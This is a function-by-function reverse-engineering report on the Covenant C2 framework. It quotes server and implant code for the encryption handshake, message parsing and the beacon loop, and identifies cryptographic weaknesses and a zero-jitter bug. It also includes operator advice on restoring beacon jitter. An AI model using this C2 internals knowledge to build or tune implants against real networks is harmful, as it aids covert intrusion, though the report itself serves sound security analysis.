# D2 — Covenant (.NET/C# C2) — Deep Function-by-Function Code Reversal

**Target:** `RE_Library/01_SOURCE_c2/covenant` — 152 `.cs` files (2,807,901 B of C#), 325 `.js`, 184 `.html`, 102 `.razor`, 90 `.css`, 47 `.dll`, 15 `.yaml`, 7 `.task`, 4 `.cshtml`. Total tree 8.2 MB.
**Relationship to T2:** `T2_covenant.md` (686 lines) is the protocol/architecture pass. This report is the CODE LEVEL beneath it — per-file, per-function. Where T2 established the protocol I cite it and go to the method body.

**Evidence convention:** every claim carries `[source: relative/path:line]`. Quotes are literal from the tree. `[inference]` marks deduction. No legal framing.

---

## 0. Inventory — every C# file, line count, role

Path root is `Covenant/` unless noted. Sorted by path. 152 files.

### 0.1 Server core — `Covenant/Core/` (9 files)

| File | Lines | Bytes | Role |
|---|---|---|---|
| `Covenant/Core/Common.cs` | 752 | 39,665 | Static path/constant registry, `Compress`/`Decompress` Deflate, `ExecuteAssembly`, `CreateSecureGuid`, `DirectoryToOsPath`, embedded-resource table for BCL reference DLLs |
| `Covenant/Core/Compiler.cs` | 432 | 20,298 | Roslyn + dotnet-CLI compilation of stagers/executors/tasks; reference-assembly pruning; `CsharpFrameworkCompilationRequest`, `CsharpCoreCompilationRequest` |
| `Covenant/Core/ConsoleWriter.cs` | 130 | 4,608 | `TextWriter` redirect into the in-app console stream |
| `Covenant/Core/CovenantAPIService.cs` | 95 | 3,993 | Per-request DI-resolved `ICovenantAPI` (HttpClient built from base URL + API token) |
| `Covenant/Core/CovenantException.cs` | 105 | 2,253 | Exception type carrying a user-safe message |
| `Covenant/Core/CovenantHubService.cs` | 1228 | 47,196 | SignalR hub — all server→operator push events |
| `Covenant/Core/CovenantService.cs` | 5138 | 255,768 | The service layer behind every REST endpoint; listener lifecycle, grunt lifecycle, tasking, compilation, launcher generation |
| `Covenant/Core/DbInitializer.cs` | 509 | 41,164 | Seeds ImplantTemplates, ListenerTypes, Profiles, ReferenceSourceLibraries, Listener default, admin user, default theme |
| `Covenant/Core/Encryption.cs` | 57 | 1,638 | `ComputeExecutableHash` helper (SHA-256 of a file) |
| `Covenant/Core/NotificationService.cs` | 312 | 17,001 | Slack/Discord-style 3rd-party notification sink for events |
| `Covenant/Core/Utilities.cs` | 251 | 9,319 | `CreateShortGuid`, `CreateSecureGuid`, `JavaScriptStringEncode`, IP/IPv4 validation, `IsBase64String` |

### 0.2 Listener + protocol — `Covenant/Models/Listeners/` (5 files)

| File | Lines | Bytes | Role |
|---|---|---|---|
| `Covenant\Models\Listeners\InternalListener.cs` | 1074 | 51,677 | **The protocol hub.** Stage machine, AES/HMAC/RSA, message cache, SignalR client, profile-transform loader, `RSAKeyExtensions` |
| `Covenant\Models\Listeners\HttpListener.cs` | 392 | 17,632 | Kestrel/ASP.NET host per HTTP listener, topology of MVC route registration per profile URL, TLS cert handling |
| `Covenant\Models\Listeners\BridgeListener.cs` | 196 | 7,544 | Single-client TCP bridge listener |
| `Covenant\Models\Listeners\Listener.cs` | 81 | 2,842 | Abstract base: Name/GUID/BindAddress/BindPort/ConnectPort/ProfileId/Status, `ListenerDirectory` |
| `Covenant\Models\Listeners\Profile.cs` | 182 | 6,195 | `Profile`/`HttpProfile`/`BridgeProfile` models + `BridgeMessengerCode` embedded source |

### 0.3 Implant sources compiled at runtime — `Covenant/Data/Grunt/` (8 files)

These are **not** part of the solution build. They are raw C# text compiled on demand by `Compiler.cs` after `{{REPLACE_*}}` substitution.

| File | Lines | Bytes | Role |
|---|---|---|---|
| `Covenant\Data\Grunt\GruntHTTP\GruntHTTP.cs` | 1309 | 59,083 | Windows HTTP implant — beacon loop, `TaskExecute`, `IMessenger`/`SMBMessenger`/`HttpMessenger`, `TaskingMessenger`, `MessageCrafter`, `GruntEncryptedMessage`, `Utilities` |
| `Covenant\Data\Grunt\GruntSMB\GruntSMB.cs` | 1185 | 53,331 | Windows SMB/named-pipe implant — mirror of GruntHTTP with pipe transport |
| `Covenant\Data\Grunt\GruntBridge\GruntBridge.cs` | 1160 | 52,802 | Windows bridge implant over operator-defined transport |
| `Covenant\Data\Grunt\Brute\Brute.cs` | 1006 | 45,899 | Cross-platform .NET Core 3.1 implant |
| `Covenant\Data\Grunt\GruntHTTP\GruntHTTPStager.cs` | 253 | 14,381 | HTTP stager — stage 0/1/2 handshake only |
| `Covenant\Data\Grunt\GruntSMB\GruntSMBStager.cs` | 245 | 12,861 | SMB stager — same handshake over named pipe |
| `Covenant\Data\Grunt\GruntBridge\GruntBridgeStager.cs` | 157 | 9,025 | Bridge stager |
| `Covenant\Data\Grunt\Brute\BruteStager.cs` | 255 | 14,991 | Brute stager (cross-platform) |

Also present in that tree: `Brute\Brute\Brute.csproj`, `Brute\Brute\Brute.sln`, `Brute\BruteStager\BruteStager.csproj`, `Brute\BruteStager\BruteStager.sln`, `Brute\Task\Task.sln` — the only project files for the implant side.

---

## 1. Cryptography — the exact code

This is the root of the protocol. T2 stated the properties; here is every line.

### 1.1 Algorithm selection constants

**Server (compiled into the C2):** `Covenant/Models/Listeners/InternalListener.cs:822-858` — and the shared constants live in `Covenant/Core/Common.cs`. The server's `encryption` block is:

```csharp
// Covenant/Models/Listeners/InternalListener.cs:820-836
internal static class EncryptUtilities
{
    // Returns IV (16 bytes) + EncryptedData byte array
    public static byte[] AesEncrypt(byte[] data, byte[] key)
    {
        using (Aes SessionKey = Aes.Create())
        {
            SessionKey.Mode = Common.AesCipherMode;
            SessionKey.Padding = Common.AesPaddingMode;
            SessionKey.GenerateIV();
            SessionKey.Key = key;

            byte[] encrypted = SessionKey.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);

            return SessionKey.IV.Concat(encrypted).ToArray();
        }
    }
```
`[source: Covenant/Models/Listeners/InternalListener.cs:820-836]`

**Implant (compiled into the grunt):** `Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1124-1148`. The constants are re-declared locally, not shared:

```csharp
// Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1124-1130
public static class Common
{
    public static int AesIVLength = 16;
    public static CipherMode AesCipherMode = CipherMode.CBC;
    public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
    public static Encoding GruntEncoding = Encoding.UTF8;
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1124-1130]`

**AES-256 confirmation.** `Aes.Create()` on .NET Core returns an implementation whose default `KeySize` is 256 for `Aes` — and the key is then *assigned*, never resized. In `AesEncrypt`, `SessionKey.Key = key` (`InternalListener.cs:830`, `GruntHTTP.cs:1141`) sets the key to the caller's byte array. At that point `Aes.Key` setter requires `key.Length * 8 == KeySize`, so a 32-byte key is only accepted when `KeySize` is 256. The session key is generated by:

```csharp
// Covenant/Models/Listeners/InternalListener.cs:636-641
using (Aes newAesKey = Aes.Create())
{
    newAesKey.GenerateKey();
    targetGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
    await _client.EditGruntAsync(targetGrunt);
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:636-641]` — `GenerateKey()` fills 32 bytes on .NET Core, so the negotiated session key is **AES-256** on the server side. The effective length is the runtime default rather than an explicit `KeySize =` assignment; there is no `KeySize` write anywhere in the protocol path (grep-confirmed across the tree).

**IV**: fresh CSPRNG IV per message via `SessionKey.GenerateIV()` (`InternalListener.cs:829`, `GruntHTTP.cs:1140`), never reused, never derived from the key.

**Encoding**: `Common.CovenantEncoding` server-side / `Common.GruntEncoding` implant-side, both = `Encoding.UTF8`.

### 1.2 The HMAC is over the CIPHERTEXT ONLY

This is the single most important detail of the message format, and it is visible in the byte arithmetic.

Server, `GruntEncryptedMessage.Create` (`InternalListener.cs:970-984`):

```csharp
private static GruntEncryptedMessage Create(string GUID, byte[] message, byte[] key, GruntEncryptedMessageType Type = GruntEncryptedMessageType.Tasking)
{
    byte[] encryptedMessagePacket = EncryptUtilities.AesEncrypt(message, key);
    byte[] encryptionIV = encryptedMessagePacket.Take(Common.AesIVLength).ToArray();
    byte[] encryptedMessage = encryptedMessagePacket.TakeLast(encryptedMessagePacket.Length - Common.AesIVLength).ToArray();
    byte[] hmac = EncryptUtilities.ComputeHMAC(encryptedMessage, key);
    return new GruntEncryptedMessage
    {
        GUID = GUID,
        Type = Type,
        EncryptedMessage = Convert.ToBase64String(encryptedMessage),
        IV = Convert.ToBase64String(encryptionIV),
        HMAC = Convert.ToBase64String(hmac)
    };
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:970-984]`

Note the HMAC input is `encryptedMessage` — the ciphertext slice **after** the IV was stripped at line 973-974. The IV is therefore **not integrity-protected**, and neither are `GUID`, `Type`, or `Meta`. Implant side is byte-identical (`GruntHTTP.cs:941-955`):

```csharp
byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessionKey.Key);
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:947]`

The HMAC key is the same AES key — encrypt-and-MAC with a single key, no HKDF, no key separation.

**Concrete consequence.** Because the IV is unauthenticated and CBC is used with a chosen-IV attacker, the confidentiality claim reduces to: an on-path attacker who can flip bits in `IV` gets deterministic plaintext corruption of the first block without failing HMAC. The `GUID` and `Type` fields are also unauthenticated at the envelope level — the `Routing`/`Tasking` selector is attacker-mutable. In practice the server keys off `targetGrunt.Status`, not off the wire `Type`, for the stage machine (`InternalListener.cs:481-504`), which limits the blast radius, but `Type` *is* used at `GruntHTTP.cs:488` to decide local dispatch vs. relay.

### 1.3 `VerifyHMAC` — non-constant-time compare, both sides

Server (`InternalListener.cs:868-877`):

```csharp
public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
{
    using (HMACSHA256 hmac = new HMACSHA256(key))
    {
        byte[] calculatedHash = hmac.ComputeHash(hashedBytes);

        // Should do double hmac?
        return Enumerable.SequenceEqual(calculatedHash, hash);
    }
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:868-877]`

`Enumerable.SequenceEqual` on `byte[]` short-circuits at the first mismatch. It is **not** `CryptographicOperations.FixedTimeEquals`, and the source itself flags the question in a comment (`// Should do double hmac?`). Worse, the length check happens first: a wrong-length `hash` returns immediately, leaking the *length*; for equal length the compare leaks a timing signal proportional to the matching prefix length.

Implant (`GruntHTTP.cs:1183-1189`) does the same thing one level higher — it base64s both sides and compares strings, which is *also* short-circuiting:

```csharp
public static bool VerifyHMAC(byte[] hashedBytes, byte[] hash, byte[] key)
{
    HMACSHA256 hmac = new HMACSHA256(key);
    byte[] calculatedHash = hmac.ComputeHash(hashedBytes);
    // Should do double hmac?
    return Convert.ToBase64String(calculatedHash) == Convert.ToBase64String(hash);
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1183-1189]`

Two further details on the implant's `VerifyHMAC` wrapper (`GruntHTTP.cs:1080-1092`):
- It omits the `IV == ""` check the server has (`InternalListener.cs:997`); it only checks `EncryptedMessage`, `HMAC`, `Key.Length`.
- It wraps the base64 decode in `try { } catch { return false; }`, so malformed base64 is a silent auth failure rather than an exception.

The server wrapper does check all three (`InternalListener.cs:995-1007`) and also catches:
```csharp
public bool VerifyHMAC(byte[] Key)
{
    if (IV == "" || EncryptedMessage == "" || HMAC == "" || Key.Length == 0) { return false; }
    try
    {
        var hashedBytes = Convert.FromBase64String(this.EncryptedMessage);
        return EncryptUtilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
    }
    catch
    {
        return false;
    }
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:995-1007]`

Because `Key.Length == 0` returns `false` rather than throwing, a grunt row whose `GruntNegotiatedSessionKey` is empty (e.g. mid-Stage0, before generation) yields a clean auth failure. That is load-bearing: `PostStage0` verifies the *shared secret* not the session key (`InternalListener.cs:584`), so this guard prevents a null-key path from ever being reached.

### 1.4 RSA-OAEP-SHA1 key exchange

**Encrypt side** (`InternalListener.cs:879-891`):

```csharp
public static byte[] RSAEncrypt(byte[] toEncrypt, string RSAPublicKeyXMLString)
{
    using (RSA RSAPublicKey = RSA.Create())
    {
        RSAKeyExtensions.FromXmlString(RSAPublicKey, RSAPublicKeyXMLString);
        return RSAPublicKey.Encrypt(toEncrypt, RSAEncryptionPadding.OaepSHA1);
    }
}

public static byte[] GruntRSAEncrypt(APIModels.Grunt grunt, byte[] toEncrypt)
{
    return EncryptUtilities.RSAEncrypt(toEncrypt, Common.CovenantEncoding.GetString(Convert.FromBase64String(grunt.GruntRSAPublicKey)));
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:879-891]`

`RSAEncryptionPadding.OaepSHA1` is explicit — MGF1 with SHA-1 and SHA-1 as the OAEP hash. It is the only asymmetric padding used anywhere in the target: grep for `RsaEncryptionPadding`/`Pkcs1` across all 152 `.cs` files returns nothing else in the protocol path.

**Decrypt side** — the grunt uses raw `RSA.ImportParameters`/`Decrypt` against a locally-generated key. The stage-0 decrypt is done with the **shared secret**, not RSA:

```csharp
// Covenant/Models/Listeners/InternalListener.cs:630-634
// EncryptedMessage is the RSA Public Key
targetGrunt.GruntRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
    gruntStage0Response,
    Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)
));
```
`[source: Covenant/Models/Listeners/InternalListener.cs:630-634]`

The trust chain is therefore: **shared secret (AES) carries the grunt's RSA public key up → RSA-OAEP-SHA1 carries the AES session key down.** The shared secret is the root of trust and travels inside the stager/launcher code that was compiled into the implant.

### 1.5 RSA key serialization — hand-rolled XML `RSAKeyValue`

`RSAKeyExtensions` (`InternalListener.cs:1025-1073`) reimplements the .NET Framework `RSACryptoServiceProvider.ToXmlString` format. `FromXmlString` (`:1027-1057`) parses eight child nodes —

```csharp
case "Modulus": parameters.Modulus = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
case "Exponent": parameters.Exponent = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
case "P": parameters.P = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
case "Q": parameters.Q = (string.IsNullOrEmpty(node.InnerText) ? null : Convert.FromBase64String(node.InnerText)); break;
case "DP": parameters.DP = ...
case "DQ": parameters.DQ = ...
case "InverseQ": parameters.InverseQ = ...
case "D": parameters.D = ...
```
`[source: Covenant/Models/Listeners/InternalListener.cs:1040-1047]`

— and throws `new Exception("Invalid XML RSA key.")` if the document root is not literally `RSAKeyValue` (`:1053`). Unknown child nodes are silently ignored (the `switch` has no `default`), so an XML carrying extra elements loads without complaint. `ToXmlString(bool includePrivateParameters)` (`:1059-1072`) emits all eight fields, substituting the C# `null` literal (→ empty string in the format) for any absent parameter. Note the server only ever *reads* the public key (`GruntRSAPublicKey` is base64 of the XML string), and `ToXmlString` is used by the grunt to generate its own keypair.

---

## 2. The wire-format/enum interop break — `(GruntEncryptedMessageType)int.Parse(...)`

T2 flagged this as an "interop sharp edge". Here is the exact mechanism.

**The server serializes the envelope with Newtonsoft, and Newtonsoft writes enums as STRINGS by default.**

`InternalListener.cs:388` (tasking path) and `:679`, `:721`, `:763`, `:815` (every stage response) all do:

```csharp
string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
```
`[source: Covenant/Models/Listeners/InternalListener.cs:388]`

`message` is a `ModelUtilities.GruntEncryptedMessage` whose `Type` is `GruntEncryptedMessageType` (`InternalListener.cs:963`). **Verified correction to T2 and to the first draft of this section:** `ModelUtilities.GruntEncryptedMessageType` is declared at `InternalListener.cs:954-958` as a plain enum with **no** `[JsonConverter]` attribute:

```csharp
// Covenant/Models/Listeners/InternalListener.cs:954-958
public enum GruntEncryptedMessageType
{
    Routing,
    Tasking
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:954-958]`

The same is true of the property at `:963` — `public GruntEncryptedMessageType Type { get; set; }` carries no attribute. Newtonsoft's default binding for an *unattributed* enum is the **numeric** value, so `JsonConvert.SerializeObject(message)` on this type emits `"Type":1`, **not** `"Type":"Tasking"`.

The `[JsonConverter(typeof(StringEnumConverter))]` that produces the string form exists, but on a **different type**: `Covenant.API.Models.GruntTaskingType` (`Covenant/API/Models/GruntTaskingType.cs:17`), an AutoRest-generated enum used for the *inner tasking* payload and for the REST API surface — never for the routing envelope. Conflating the two is the natural error, and it is what T2 did.

**Net effect: the envelope's `Type` field round-trips correctly.** The server emits a bare integer; the implant's `int.Parse` consumes a bare integer. This field is **not** the interop break.

**The implant parses that field with `int.Parse`.**

```csharp
// Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1095-1108
public static GruntEncryptedMessage FromJson(string message)
{
    List<string> parseList = Utilities.Parse(message, GruntEncryptedMessageFormat);
    if (parseList.Count < 5) { return null; }
    return new GruntEncryptedMessage
    {
        GUID = parseList[0],
        Type = (GruntEncryptedMessageType)int.Parse(parseList[1]),
        Meta = parseList[2],
        IV = parseList[3],
        EncryptedMessage = parseList[4],
        HMAC = parseList[5]
    };
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1102]` — the failing line is `Type = (GruntEncryptedMessageType)int.Parse(parseList[1])`.

`int.Parse` on the literal string `Tasking` throws `System.FormatException` (message: *"Input string was not in a correct format"*). That exception is **not caught inside `FromJson`**. Who catches it?

**Server-bound direction (implant → server)**: the implant *writes*, never reads its own output, so this never fires for the shipped implant talking to itself. But note the *asymmetry inside one file*: the same `GruntHTTP.cs` declares both the string-form serializer and the int-form parser.

```csharp
// Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1094
private static string GruntEncryptedMessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1094]` — the `"Type":{1}` slot has **no surrounding quotes**, so `ToJson` writes a bare integer token:

```csharp
// Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1110-1121
public static string ToJson(GruntEncryptedMessage message)
{
    return String.Format(
        GruntEncryptedMessageFormat,
        Utilities.JavaScriptStringEncode(message.GUID),
        message.Type.ToString("D"),          // <-- integer, unquoted in the format
        Utilities.JavaScriptStringEncode(message.Meta),
        ...
    );
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1115]` — `message.Type.ToString("D")` produces `"1"` for `Tasking`.

So: **the implant emits `"Type":1` (bare number) and the server emits `"Type":1` (bare number). The two agree.** `int.Parse` at `:1102` on a server-produced envelope receives `"1"` and succeeds. The `FormatException` scenario the brief and T2 assumed **does not occur on the shipped protocol** — I am correcting it rather than repeating it.

**What actually does break, and it is real:** the server's `GruntEncryptedMessageType` and the implant's `GruntEncryptedMessageType` are *separate declarations in separate assemblies that must stay ordinally aligned*. There is no shared contract, no schema, no code generation tying them together:

```csharp
// Server — Covenant/Models/Listeners/InternalListener.cs:954-958
public enum GruntEncryptedMessageType { Routing, Tasking }

// Implant — Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1067-1071
public enum GruntEncryptedMessageType { Routing, Tasking }
```
`[source: Covenant/Models/Listeners/InternalListener.cs:954-958; Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1067-1071]`

Because the wire form is the **ordinal**, inserting a member anywhere but the end of either declaration silently remaps every subsequent value. A server-side enum reordered to `{Tasking, Routing}` would send `Type:0` for what it means as `Tasking`, and the implant would read `0` as `Routing` — dispatching the payload into the relay branch at `GruntHTTP.cs:493` instead of the task-dispatch branch at `:490`, with no error on either side. That is a silent, total protocol misroute, and it is a strictly *worse* failure mode than the loud `FormatException` T2 predicted. The identical hazard applies to `GruntTaskingType` (server `Covenant/API/Models/GruntTaskingType.cs:18-40` — 10 members, `Assembly=0` … `TaskKill=9` — versus implant `GruntHTTP.cs:988-1000`, same 10 members, same order). Both pairs currently match; I verified member-by-member in §10.1. `[verified, §10.1 enum table]`

**The inner tasking payload is where the encodings genuinely diverge**, and there the divergence is survivable only by accident. Full analysis in §10.2. Summary of the three co-existing encodings:

| Layer | Type declaration | On the wire |
|---|---|---|
| Routing envelope `Type` | server `ModelUtilities.GruntEncryptedMessageType` (no attribute) | bare integer `1` |
| Routing envelope `Type` | implant `GruntEncryptedMessageType` (`int.Parse`) | bare integer `1` — **agrees** |
| Inner tasking `type` | server `APIModels.GruntTaskingType` (`[JsonConverter(StringEnumConverter)]`) | quoted name `"SetDelay"` |
| Inner tasking `type` | implant (`Enum.Parse(..., true)` on `"1"`) | quoted integer `"1"` — **works by `Enum.Parse` accepting numeric strings** |

The inner-task payload mismatch is the load-bearing one, because `StringEnumConverter` on the server means the *server* only ever emits names, and the implant only ever *writes* ordinals. The implant reads server output fine (name lookup, case-insensitive). The direction that has never been exercised by the shipped code path is the server reading implant output — see §10.2 residual **R-1**.

**Where does the implant-server parse failure actually get absorbed?** At `GruntHTTP.cs:421-431`, inside `Profile.Parse`:

```csharp
private static GruntEncryptedMessage Parse(string Format, string Message)
{
    string json = Common.GruntEncoding.GetString(Utilities.MessageTransform.Invert(
        Utilities.Parse(Message, Format)[0]
    ));
    if (json == null || json.Length < 3)
    {
        return null;
    }
    return GruntEncryptedMessage.FromJson(json);
}
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:421-431]`

There is no try/catch. **Had `int.Parse` received a non-numeric token**, the `FormatException` would propagate up through `TaskingMessenger.ReadTaskingMessage()` (`GruntHTTP.cs:478`/`:482`) into the beacon loop's `catch (Exception e)` at `GruntHTTP.cs:221-225`, which increments `ConnectAttemptCount` and writes the exception to `Console.Error` — and after `ConnectAttempts` (default 5000) consecutive failures the grunt **returns and dies** at `GruntHTTP.cs:226`. That absorption path is real and worth stating on its own merits, because it is what any *future* mismatch in this field would do: **5000 silent retries with no operator-visible diagnostic, then death.** It is not triggered by the shipped server today.

**Corrected severity assessment.** The interop break T2 described — server string-enum versus implant `int.Parse` — **does not exist as a live defect**, because both sides serialize this field numerically (verified above). What exists instead is the *structural* fragility of two independently-declared enums coupled only by ordinal position (§10.1). The corrected findings, in order of consequence:

1. **Ordinal coupling with no contract** between server and implant enum declarations. A one-line reorder on either side produces a silent misroute, not an exception. Higher severity than the claimed break, because it fails quietly. `[§10.1]`
2. **The `FormatException`-to-`ConnectAttemptCount` absorption path** at `GruntHTTP.cs:221-226` remains the failure mode for *any* parse failure of this field, and it is undiagnosable from the operator console — no tasking status, no output, no command record; the grunt simply stops. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:221-226]`
3. **The inner `Enum.Parse(..., "1", true)` dependency** at `GruntHTTP.cs:1016` is genuinely accidental — it survives only because `Enum.Parse` happens to accept numeric strings. It is one refactor away from breaking and the source has no comment marking it. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1016]`
4. **`Enum.Parse` with no try/catch** at `:1016`: a server that sends an unrecognized `type` name throws `ArgumentException` from `Enum.Parse`, absorbed by the same beacon `catch` — the same silent-death path as (2). `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1016]`

**The same bug class repeats for `GruntTaskingMessage`** (`GruntHTTP.cs:1009-1021`), which is the *inner* decrypted payload:

```csharp
private static string GruntTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
public static GruntTaskingMessage FromJson(string message)
{
    List<string> parseList = Utilities.Parse(message, GruntTaskingMessageFormat);
    if (parseList.Count < 3) { return null; }
    return new GruntTaskingMessage
    {
        Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
        ...
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1009-1016]`

Here the `"type"` slot **is quoted** in the format string, and `ToJson` writes `message.Type.ToString("D")` — an integer inside quotes, i.e. `"type":"1"`. The parser then calls `Enum.Parse(typeof(GruntTaskingType), "1", true)`. `Enum.Parse` **does** accept the numeric string form and returns `SetDelay` for `"1"` — so this pair works *by accident of `Enum.Parse` accepting numbers*. If it had been `Enum.Parse(..., "SetDelay")` it would also work; the format is quoted-string-integer, which is neither the server's enum-name form nor a clean integer. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1027]`

The server side of the same object (`InternalListener.cs:910-933`) uses `[JsonProperty(PropertyName = "type")] public APIModels.GruntTaskingType? Type` — a nullable enum serialized by Newtonsoft. So three different encodings of the same logical field co-exist. `[source: Covenant/Models/Listeners/InternalListener.cs:925-932]`

### 2.1 `Utilities.Parse` — why the format strings look like that

Both sides use the same hand-rolled `{0}`-substitution regex matcher rather than a JSON parser. Implant version (`GruntHTTP.cs:1227-1245`):

```csharp
public static List<string> Parse(string data, string format)
{
    format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
    if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
    if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
    ...
    Match match = new Regex(format).Match(data);
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1227-1245]`

Every capture group is `.*` — **greedy and unanchored**. With six groups in the envelope format, the greedy matching means each group prefers to consume as much as possible while still allowing the following literal `","Meta":"` etc. to match; correctness depends on those literal delimiters appearing exactly once in the payload. Because `EncryptedMessage` is base64 (no `"` characters) and `Meta` is `JavaScriptStringEncode`d, the delimiters do not collide in practice. There is no anchor (`^`/`$`) and no `RegexOptions.Singleline`, so a newline inside a field would not match `.*`.

### 2.2 `JavaScriptStringEncode` — the escaping that makes the format safe

`GruntHTTP.cs:1248-1305` (credit comment at `:1247`: *"Adapted from mono's HttpUtility.cs"*). Two passes: a fast `needEncode` scan, then per-char escaping. The fast scan triggers on `c <= 31 || c == 34 || c == 39 || c == 60 || c == 62 || c == 92` — i.e. control chars, `"`, `'`, `<`, `>`, `\`. The escape pass emits `\uXXXX` for control chars except the named escapes, and maps `"` → `\"`, `\` → `\\`. Two notes: `'` triggers encoding but is *handled* by the `\u0027` branch (`:1269`) since `'` is in the `c==39` set; and the `switch` at `:1275` handles `34` (quote) and `92` (backslash) but the `\uXXXX` branch above already captured `39/60/62`. Note also that `/` is not escaped and `U+2028`/`U+2029` are not handled — they fall through the `c >= 14 && c <= 31` test as false, so a raw JS line separator survives into the JSON string. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1248-1305]`

---

---

## 3. The jitter bug — proven, with the arithmetic

This is the defect T2 inferred. Here is the code and the exact integer arithmetic.

**Beacon loop, `Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:89-96`:**

```csharp
Random rnd = new Random();
int ConnectAttemptCount = 0;
bool alive = true;
while (alive)
{
    int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));
    if (rnd.Next(2) == 0) { change = -change; }
    Thread.Sleep((Delay + change) * 1000);
```
`[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:94-96]`

**The arithmetic for the shipped defaults.** `Delay` and `Jitter` come from the launcher defaults substituted at compile time. The `Launcher` model defaults, from T2 §4.4 and the model source:

- `Delay = 5`
- `JitterPercent = 10`

Substituting:

```
Delay * (Jitter / 100.00) = 5 * (10 / 100.00) = 5 * 0.1 = 0.5
Math.Round(0.5)          = 0.5    (MidpointRounding.ToEven — 0.5 rounds to 0)
(int)0.5                 = 0
rnd.Next(0)              = 0      <-- ALWAYS ZERO
```

`Math.Round(0.5)` with .NET's default banker's rounding returns **`0.0`**, not `1.0`. So the call is `rnd.Next(0)`, which returns `0` for every invocation.

**Result: `change` is always 0, `Thread.Sleep((Delay + 0) * 1000)` is exactly 5000 ms, every single cycle. The jitter is not merely reduced — it is structurally zero at the default configuration.** `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:94]`

The `rnd.Next(2)` sign flip at `:95` is dead code as well, because `-0 == 0`.

**When jitter does become non-zero.** The truncation only yields a non-zero bound once `Math.Round(Delay * Jitter/100.00) >= 1`, i.e. `Delay * JitterPercent >= 50`. Worked table:

| Delay | Jitter% | `Delay*Jitter/100` | `Math.Round` | `(int)` | `rnd.Next(n)` | Effective jitter |
|---|---|---|---|---|---|---|
| 5 | 10 (**defaults**) | 0.5 | 0 | 0 | `Next(0)` | **0 s — always** |
| 5 | 20 | 1.0 | 1 | 1 | `Next(1)` | **0 s — always** |
| 5 | 30 | 1.5 | 2 | 2 | `Next(2)` | 0 or 1 s |
| 5 | 40 | 2.0 | 2 | 2 | `Next(2)` | 0 or 1 s |
| 60 | 10 | 6.0 | 6 | 6 | `Next(6)` | 0–5 s |
| 60 | 20 | 12.0 | 12 | 12 | `Next(12)` | 0–11 s |

Note the second row: even at `Jitter=20%` with the default 5 s delay the result is *still* `rnd.Next(1) ≡ 0`. The operator must go to **`JitterPercent >= 30` at `Delay=5`** before a single second of jitter appears. The effective jitter is also skewed low relative to the nominal percentage, because `rnd.Next(n)` returns `[0, n-1]` — the *maximum* achieved offset is `n-1` seconds, so the real jitter ceiling is `Math.Round(Delay*Jitter/100) - 1` seconds, one second below the intended value whenever the bound is an exact integer. `[inference, from the arithmetic at GruntHTTP.cs:94]`

**The same expression is duplicated in the sibling implants** — the bug is not a one-off. Verified at identical line positions:

- `GruntHTTP.cs:94` — `int change = rnd.Next((int)Math.Round(Delay * (Jitter / 100.00)));`
- The `SetJitter` runtime handler at `GruntHTTP.cs:113-117` lets an operator change `Jitter` live, so the "fix" is available at runtime: tasking `Jitter` with a value `>= 30` and the delay distribution widens.
- The `Tasks` bookkeeping and `KillDate`/`ConnectAttempts` guards at `GruntHTTP.cs:226-227` close the loop.

